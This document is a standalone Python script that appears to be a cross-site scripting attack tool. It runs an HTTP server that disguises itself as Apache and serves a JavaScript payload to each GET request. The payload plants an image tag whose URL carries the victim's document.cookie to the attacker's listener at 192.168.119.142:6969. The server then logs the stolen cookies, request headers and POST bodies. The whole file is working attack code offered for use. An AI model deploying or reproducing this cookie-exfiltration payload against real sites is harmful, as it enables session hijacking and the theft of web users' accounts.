#!/usr/bin/python3
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from http.cookies import SimpleCookie

# Global variables
timeout = 3
server_token = "Apache"
host = "192.168.119.142"
port = 6969

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def printCookie(cookie):
    for key,morsel in cookie.items():
        print("Cookie: " + morsel.key + "=" + morsel.value)

def js_code(host,port):
    js = ('function addTheImage() {'
        'var img = document.createElement(\'img\');'
        'img.src = \'http://' + host + ':' + str(port) + '/\' + document.cookie;'
        'document.body.appendChild(img);'
        '}'
    'addTheImage();')
    return js

class serveHTTP(BaseHTTPRequestHandler):
    def do_GET(s):
        all_cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        cookies = {}
        print("\n[*] GET:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers))
        printCookie(all_cookies)
        print("\n")
        payload = js_code(host,port)
        s.wfile.write(payload.encode())

    def do_POST(s):
        cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print("\n[*] POST:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers) + "Params:\n" +  postVar.decode() + "\n")

# Main
def main(argv):
    #if len(sys.argv) == 2:
    #    host = sys.argv[1]
    #    port = int(sys.argv[2])
    #else:
    #    print("[*] Usage: " + sys.argv[0] + "\n")
    #    exit(0)

    server_class = HTTPServer
    httpd = server_class(('', port), serveHTTP)

    # Do stuff
    try:
        print("[*] Accepting HTTP connections on host " + host + " port " + str(port) + "...")
        httpd.serve_forever()
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
